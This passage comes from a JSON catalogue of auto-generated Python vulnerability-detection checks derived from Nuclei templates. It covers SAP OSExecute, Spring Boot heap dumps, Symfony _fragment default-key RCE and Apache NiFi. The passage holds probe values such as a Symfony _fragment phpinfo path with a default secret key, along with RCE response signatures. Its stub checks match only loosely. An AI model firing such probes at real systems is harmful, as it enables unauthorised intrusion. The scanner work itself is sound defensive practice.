or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'OSExecuteResponse, <output>' | regex ['uid=[0-9]+\\\\\\\\('] | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['OSExecuteResponse, <output>', 'uid=[0-9]+\\\\\\\\(']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"SAPControl OSExecute - Remote Code Execution (RCE)\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_sap_osexecute_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "misconfig",
          "sap",
          "sapcontrol",
          "soap",
          "rce",
          "osexecute"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_springboot_heapdump",
        "name": "Spring Boot Actuator - Heap Dump Detection",
        "language": "Python",
        "famille": "Exposure",
        "description": "A Spring Boot Actuator heap dump was detected. A heap dump is a snapshot of JVM memory, which could expose environment variables and HTTP requests.",
        "severity": "critical",
        "detection": "[OR] DSL: !contains(hex_encode(body_1), '1f8b080000000000'); contains(hex_encode(body_2), '1f8b080000000000') | DSL: !contains(hex_encode(body_1), '1f8b080000000000'); contains(hex_encode(body_3), '1f8b080000000000') | DSL: contains(hex_encode(body_2), '4a4156412050524f46494c45') || contains(hex_encode(body_2), '4850524f46'); contains(hex_encode(body_3), '4a4156412050524f46494c45') || contains(hex_encode(body_3), '4850524f46')",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "str",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: str",
            "default": "{{rand_base(6)}}"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: springboot-heapdump\nName: Spring Boot Actuator - Heap Dump Detection\nSeverity: critical\nDescription: A Spring Boot Actuator heap dump was detected. A heap dump is a snapshot of JVM memory, which could expose environment variables and HTTP requests.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_springboot_heapdump:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"springboot-heapdump\"\n    SEVERITY = \"critical\"\n    NAME = \"Spring Boot Actuator - Heap Dump Detection\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[OR] DSL: !contains(hex_encode(body_1), '1f8b080000000000'); contains(hex_encode(body_2), '1f8b080000000000') | DSL: !contains(hex_encode(body_1), '1f8b080000000000'); contains(hex_encode(body_3), '1f8b080000000000') | DSL: contains(hex_encode(body_2), '4a4156412050524f46494c45') || contains(hex_encode(body_2), '4850524f46'); contains(hex_encode(body_3), '4a4156412050524f46494c45') || contains(hex_encode(body_3), '4850524f46')\"\n\n        # Simple word matcher simulation\n        matchers = ['1f8b080000000000', '1f8b080000000000', '1f8b080000000000', '1f8b080000000000', '4a4156412050524f46494c45']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Spring Boot Actuator - Heap Dump Detection\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_springboot_heapdump(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: springboot-heapdump\nName: Spring Boot Actuator - Heap Dump Detection\nSeverity: critical\nDescription: A Spring Boot Actuator heap dump was detected. A heap dump is a snapshot of JVM memory, which could expose environment variables and HTTP requests.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_springboot_heapdump:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"springboot-heapdump\"\n    SEVERITY = \"critical\"\n    NAME = \"Spring Boot Actuator - Heap Dump Detection\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[OR] DSL: !contains(hex_encode(body_1), '1f8b080000000000'); contains(hex_encode(body_2), '1f8b080000000000') | DSL: !contains(hex_encode(body_1), '1f8b080000000000'); contains(hex_encode(body_3), '1f8b080000000000') | DSL: contains(hex_encode(body_2), '4a4156412050524f46494c45') || contains(hex_encode(body_2), '4850524f46'); contains(hex_encode(body_3), '4a4156412050524f46494c45') || contains(hex_encode(body_3), '4850524f46')\"\n\n        # Simple word matcher simulation\n        matchers = ['1f8b080000000000', '1f8b080000000000', '1f8b080000000000', '1f8b080000000000', '4a4156412050524f46494c45']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Spring Boot Actuator - Heap Dump Detection\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_springboot_heapdump(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "springboot",
          "exposure",
          "misconfig",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_symfony_rce",
        "name": "Symfony _fragment - Default Key RCE",
        "language": "Python",
        "famille": "Misconfiguration",
        "description": "Symfony servers support a \"/_fragment\" command that allows clients to provide custom PHP commands and return the HTML output.\nThis template checks to see if they also use a popular default secret key for remote command execution.",
        "severity": "critical",
        "detection": "[OR] DSL: status_code == 403; contains(body, 'symfony') / [AND] DSL: status_code == 200; contains(body, 'PHP Version')",
        "parameters": [
          {
            "name": "base_url",
            "datatype": "string",
            "required": true,
            "description": "URL de base de la cible"
          },
          {
            "name": "badsecretkey",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: badsecretkey",
            "default": "ThisIsAlmostCertainlyNotIt"
          },
          {
            "name": "uri_part",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: uri_part",
            "default": "_fragment?_path=what%3D-1%26_controller%3Dphpinfo"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: symfony-rce\nName: Symfony _fragment - Default Key RCE\nSeverity: critical\nDescription: Symfony servers support a \"/_fragment\" command that allows clients to provide custom PHP commands and return the HTML output.\nThis template checks to see if they also use a popular default secret key for remote command execution.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_symfony_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"symfony-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"Symfony _fragment - Default Key RCE\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[OR] DSL: status_code == 403; contains(body, 'symfony') / [AND] DSL: status_code == 200; contains(body, 'PHP Version')\"\n\n        # Simple word matcher simulation\n        matchers = ['symfony', 'PHP Version']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Symfony _fragment - Default Key RCE\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_symfony_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: symfony-rce\nName: Symfony _fragment - Default Key RCE\nSeverity: critical\nDescription: Symfony servers support a \"/_fragment\" command that allows clients to provide custom PHP commands and return the HTML output.\nThis template checks to see if they also use a popular default secret key for remote command execution.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_symfony_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"symfony-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"Symfony _fragment - Default Key RCE\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[OR] DSL: status_code == 403; contains(body, 'symfony') / [AND] DSL: status_code == 200; contains(body, 'PHP Version')\"\n\n        # Simple word matcher simulation\n        matchers = ['symfony', 'PHP Version']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Symfony _fragment - Default Key RCE\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_symfony_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "rce",
          "symfony",
          "misconfig",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_apache_nifi_rce",
        "name": "Apache NiFi - Remote Code Execution",
        "language": "Python",
        "famille": "WebApp",
        "description": "Apache NiFi is designed for data streaming. It supports highly configurable data routing, transformation, and system mediation logic that indicate graphs. The system has unauthorized remote command execution vulnerability.",
        "severity": "critical",
        "detection": "[AND] mot(s) 'revision, canRead, permissions' | mot(s) 'application/json' | status HTTP [200]",
        "parameters": [
          {
            "name": "base_url",
            "datatype": "string",
            "required": true,
            "description": "URL de base de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
